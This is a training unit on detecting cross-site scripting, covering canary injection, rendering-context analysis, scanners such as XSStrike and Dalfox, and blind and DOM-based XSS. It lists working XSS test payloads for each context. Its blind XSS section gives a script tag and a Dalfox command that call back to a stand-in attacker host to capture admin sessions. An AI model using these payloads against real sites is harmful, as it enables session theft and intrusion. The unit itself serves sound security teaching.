# Unit 6: Cross-Site Scripting (XSS) — Topic 2: XSS Detection

## Overview

Detecting XSS vulnerabilities requires a systematic approach that combines manual testing with automated scanning. A skilled tester must understand how user input flows through an application, where it is reflected or rendered, and what context it lands in — HTML body, attributes, JavaScript, or URL parameters. This topic covers the methodology, tools, and context-aware techniques needed to reliably identify XSS flaws in modern web applications.

---

## 1. Detection Methodology

### Step-by-Step Testing Flow

```
+---------------------+
| 1. Map Input Points |   Identify all parameters: query strings,
+----------+----------+   form fields, headers, cookies, URL fragments
           |
           v
+---------------------+
| 2. Inject Canary    |   Use a unique string (e.g., xss7r4c3) to
+----------+----------+   track where input is reflected
           |
           v
+---------------------+
| 3. Identify Context |   Determine WHERE the canary appears:
+----------+----------+   HTML body, attribute, JS, URL, CSS
           |
           v
+---------------------+
| 4. Craft Payload    |   Build a context-appropriate payload
+----------+----------+   that escapes current context
           |
           v
+---------------------+
| 5. Test Execution   |   Verify if payload executes in browser
+----------+----------+   (check DOM, console, network tab)
           |
           v
+---------------------+
| 6. Validate Impact  |   Confirm exploitability: cookie access,
+---------------------+   DOM manipulation, data exfiltration
```

---

## 2. Manual Detection Techniques

### 2.1 Input/Output Mapping

Inject a unique non-malicious string and trace it through the application:

```
Canary String: keval8x3test

Inject into:
  - Search fields       → GET /search?q=keval8x3test
  - Form inputs         → POST /profile  name=keval8x3test
  - HTTP headers        → Referer: keval8x3test
  - URL path segments   → GET /user/keval8x3test/profile
  - File upload names   → filename="keval8x3test.jpg"
```

Search the response for the canary. Note every location where it appears — each location is a potential injection point.

### 2.2 Context Analysis

Once you locate where input is reflected, determine the rendering context:

| Context          | Example Output                                      | Breakout Strategy                  |
|------------------|-----------------------------------------------------|------------------------------------|
| HTML Body        | `<p>Hello keval8x3test</p>`                         | Inject `<script>` or `<img>`     |
| HTML Attribute   | `<input value="keval8x3test">`                      | Close quote, add event handler    |
| JavaScript       | `var x = "keval8x3test";`                           | Close string, inject JS code      |
| URL / href       | `<a href="keval8x3test">`                           | Use `javascript:` protocol        |
| CSS              | `background: url(keval8x3test)`                     | Use `expression()` or escape      |
| Inside comments  | `<!-- keval8x3test -->`                              | Close comment `-->`, inject tag   |

### 2.3 Browser Developer Tools

```
Steps:
  1. Open DevTools (F12) → Elements tab
  2. Search (Ctrl+F) for your canary string
  3. Note the exact DOM location
  4. Check if encoding was applied
  5. Switch to Console tab → look for JS errors
  6. Network tab → monitor outbound requests from payload
```

---

## 3. Context-Aware Testing

### 3.1 HTML Context

```html
<!-- Input reflected in HTML body -->
<div>Welcome, USER_INPUT</div>

<!-- Test payloads -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
```

### 3.2 Attribute Context

```html
<!-- Input reflected inside an attribute -->
<input type="text" value="USER_INPUT">

<!-- Test payloads -->
" onfocus=alert(1) autofocus="
" onmouseover=alert(1) x="
"><script>alert(1)</script>
' onfocus='alert(1)' autofocus='
```

### 3.3 JavaScript Context

```html
<!-- Input reflected inside JS code -->
<script>var search = "USER_INPUT";</script>

<!-- Test payloads -->
";alert(1);//
'-alert(1)-'
\";alert(1);//
</script><script>alert(1)</script>
```

### 3.4 URL / href Context

```html
<!-- Input reflected in a URL attribute -->
<a href="USER_INPUT">Click</a>

<!-- Test payloads -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>
javascript:alert(document.domain)
```

---

## 4. Automated Detection Tools

### 4.1 Burp Suite Scanner

```
Setup:
  1. Configure browser proxy → 127.0.0.1:8080
  2. Browse the target application (spider/crawl)
  3. Right-click request → "Scan" or use Active Scanner
  4. Review Issues tab → filter for "Cross-site scripting"

Intruder XSS Testing:
  1. Send request to Intruder
  2. Mark injection point: GET /search?q=§payload§
  3. Load XSS payload list (Burp built-in or custom)
  4. Start attack → review responses for unescaped output
  5. Use Grep → match for payload strings in response
```

### 4.2 XSStrike

```bash
# Basic scan
python3 xsstrike.py -u "http://target.com/search?q=test"

# Crawl and scan
python3 xsstrike.py -u "http://target.com" --crawl

# Scan with custom headers
python3 xsstrike.py -u "http://target.com/page?id=1" \
  --headers "Cookie: session=abc123"

# Fuzzing mode
python3 xsstrike.py -u "http://target.com/search?q=test" --fuzzer

# Blind XSS testing
python3 xsstrike.py -u "http://target.com/contact" \
  --data "name=test&message=test" --blind
```

### 4.3 Dalfox

```bash
# Basic scan
dalfox url "http://target.com/search?q=test"

# Pipe URLs from a file
cat urls.txt | dalfox pipe

# Scan with custom payloads
dalfox url "http://target.com/?q=test" \
  --custom-payload payload_list.txt

# Use blind XSS callback
dalfox url "http://target.com/?q=test" \
  --blind "https://your-callback.xss.ht"

# Output to file
dalfox url "http://target.com/?q=test" -o results.txt
```

### 4.4 Tool Comparison

| Feature             | Burp Scanner       | XSStrike           | Dalfox              |
|---------------------|--------------------|---------------------|----------------------|
| **Type**            | Commercial suite   | Open-source Python  | Open-source Go       |
| **Speed**           | Moderate           | Moderate            | Fast                 |
| **Context analysis**| Yes                | Yes                 | Yes                  |
| **DOM XSS**         | Yes (via Burp DOM) | Limited             | Limited              |
| **WAF detection**   | Yes                | Yes                 | Yes                  |
| **Blind XSS**      | Yes (Collaborator) | Yes                 | Yes                  |
| **CI/CD friendly**  | Via API            | CLI-based           | CLI-based            |
| **Best for**        | Comprehensive test | Targeted parameter  | Bulk URL scanning    |

---

## 5. Blind XSS Detection

Blind XSS payloads execute in contexts you cannot directly observe (admin panels, logs, support tickets).

```
Blind XSS Testing Flow:
                                                     +-------------------+
Attacker injects payload -----> Application stores   | Admin views the   |
in contact form / ticket        payload in DB        | ticket / log page |
                                                     +--------+----------+
                                                              |
                                                     Payload fires, calls
                                                     back to attacker's
                                                     server with page data
                                                              |
                                                              v
                                                     +-------------------+
                                                     | Attacker receives |
                                                     | admin session,    |
                                                     | page screenshot   |
                                                     +-------------------+

Popular Blind XSS Platforms:
  - XSS Hunter (xsshunter.com)
  - bXSS (self-hosted)
  - ezXSS

Example Payload:
"><script src=https://yourserver.xss.ht></script>
```

---

## 6. DOM-Based XSS Detection

DOM XSS requires analysing client-side JavaScript rather than server responses:

```bash
# Search JS files for dangerous sinks
grep -rn "innerHTML\|outerHTML\|document.write\|eval(" *.js

# Search for source-to-sink flows
grep -rn "location.hash\|location.search\|document.URL" *.js

# Browser: Enable DOM XSS detection in DevTools
# Sources tab → Event Listener Breakpoints → Script → Script First Statement
```

**Taint tracking tools:** DOM Invader (Burp), Untrusted Types API, and browser extensions that flag dangerous DOM operations.

---

## Summary Table

| Detection Method        | Best For                        | Limitation                       |
|-------------------------|---------------------------------|----------------------------------|
| Manual canary injection | Precise context identification  | Time-consuming at scale          |
| Burp Scanner            | Comprehensive app-wide testing  | Requires license; false positives|
| XSStrike                | Targeted parameter testing      | Limited DOM XSS detection        |
| Dalfox                  | Bulk scanning many URLs         | May miss complex injection flows |
| Blind XSS platforms     | Admin panel / backend XSS       | Requires patience; delayed fire  |
| JS static analysis      | DOM-based XSS in source code    | High false-positive rate         |

---

## Revision Questions

1. **Why is injecting a unique canary string the recommended first step before testing with actual XSS payloads?**

2. **You find your input reflected inside a JavaScript string literal: `var x = "USER_INPUT";`. What payload would you craft and why?**

3. **What is the key difference between testing for Reflected XSS and Blind XSS in terms of result verification?**

4. **Name two advantages and two disadvantages of using automated XSS scanners versus manual testing.**

5. **How would you detect DOM-based XSS that never touches the server? Describe your approach and tools.**

6. **Explain why context-aware testing is critical — why can't a single generic payload work across all XSS scenarios?**

---

*Previous: [01-xss-types.md](01-xss-types.md) | Next: [03-payload-crafting.md](03-payload-crafting.md)*

---

*[Back to README](../README.md)*
